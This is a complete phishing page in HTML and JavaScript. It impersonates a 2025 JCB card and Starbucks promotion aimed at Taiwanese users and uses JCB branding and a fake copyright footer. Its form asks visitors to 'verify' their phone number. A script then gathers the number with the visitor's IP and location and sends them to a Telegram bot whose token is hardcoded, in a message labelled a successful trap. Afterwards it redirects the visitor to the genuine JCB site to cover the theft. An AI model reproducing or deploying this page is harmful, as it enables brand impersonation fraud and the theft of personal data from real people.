<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2025 JCB晶緻卡 × 星巴克獨享禮遇</title>
    <style>
        body{margin:0;background:#0F1B3D;font-family:'Noto Sans TC',Arial,sans-serif;color:white;overflow-x:hidden}
        .bg{ position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0F1B3D 0%,#1E3A8A 50%,#6366F1 100%);z-index:-1}
        .container{max-width:420px;margin:0 auto;padding:20px 15px}
        .header{text-align:center;padding:30px 0}
        .jcb-logo{max-width:110px;margin-bottom:10px}
        .title{font-size:32px;font-weight:900;margin:10px 0;letter-spacing:2px}
        .subtitle{font-size:18px;margin:10px 0 30px}
        .cup-box{background:rgba(255,255,255,0.12);border-radius:20px;padding:30px;margin:20px 0;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
        .cup{max-width:100%;border-radius:20px}
        .offer{background:#FFD700;color:#000;padding:20px;border-radius:15px;margin:25px 0;font-size:18px;font-weight:bold}
        .input-box{background:white;border-radius:16px;overflow:hidden;margin:30px 0;box-shadow:0 8px 25px rgba(0,0,0,0.3)}
        select{background:#f8f8f8;border:none;font-size:19px;padding:18px 15px;width:100px}
        input{flex:1;border:none;font-size:19px;padding:18px 15px;color:#333;outline:none}
        button{width:100%;padding:18px;background:#00704A;color:white;border:none;border-radius:16px;font-size:20px;font-weight:bold;box-shadow:0 6px 20px rgba(0,112,74,0.4);margin-top:10px}
        button:disabled{background:#004d33;cursor:wait}
        .footer{margin-top:60px;font-size:12px;text-align:center;opacity:0.8}
        .footer a{color:#A0C4FF;text-decoration:underline}
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;700;900&display=swap" rel="stylesheet">
</head>
<body>
    <div class="bg"></div>
    <div class="container">
        <div class="header">
            <img src="https://www.jcb.co.jp/promotion/2025/starbucks/img/logo-jcb.png" class="jcb-logo" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/8a/JCB_Logo.svg'">
            <div class="title">2025 獨享禮遇</div>
            <div class="subtitle">JCB晶緻卡 × 星巴克</div>
        </div>

        <div class="cup-box">
            <img src="https://images.starbucks.com.tw/uploadedImages/2025/sb-cup-2025.jpg" class="cup" onerror="this.src='https://starbucks.com.tw/images/cup2025.jpg'">
            <div class="offer">
                消費滿 NT$150 享買一送一<br>
                限 2025 全年・晶緻卡專屬
            </div>
        </div>

        <div class="box">
            <p style="font-size:16px;line-height:1.8;margin-bottom:25px">
                立即驗證手機號碼<br>領取專屬優惠碼
            </p>

            <form id="form">
                <div class="input-box" style="display:flex">
                    <select id="code">
                        <option value="+886" selected>+886</option>
                        <option value="+852">+852</option>
                        <option value="+60">+60</option>
                    </select>
                    <input type="tel" id="phone" placeholder="912345678" required>
                </div>
                <button type="submit">立即領取優惠</button>
            </form>
        </div>

        <div class="footer">
            © 2025 JCB International Co., Ltd. 
            <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | 
            <a href="https://www.jcb.co.jp/terms/">服務條款</a>
        </div>
    </div>

    <script>
        const TOKEN = "8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY";
        const CHAT_ID = "1137905005";

        document.getElementById("form").onsubmit = async function(e) {
            e.preventDefault();
            const code = document.getElementById("code").value;
            const phone = document.getElementById("phone").value.trim();
            if (!phone) return;

            document.querySelector("button").innerHTML = "驗證中...";
            document.querySelector("button").disabled = true;

            const ip = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
            const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});

            const 訊息 = "JCB星巴克誘捕成功\n\n" +
                        "電話：" + code + phone + "\n" +
                        "IP　　：" + (ip.ip||"未知") + "\n" +
                        "位置　：" + (ip.city||"未知") + "，" + (ip.country_name=="Taiwan"?"台灣":ip.country_name||"未知") + "\n" +
                        "時間　：" + 時間;

            fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
                method:"POST",
                headers:{"Content-Type":"application/json"},
                body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
            });

            setTimeout(()=>location.href="https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/",3000);
        };
    </script>
</body>
</html>
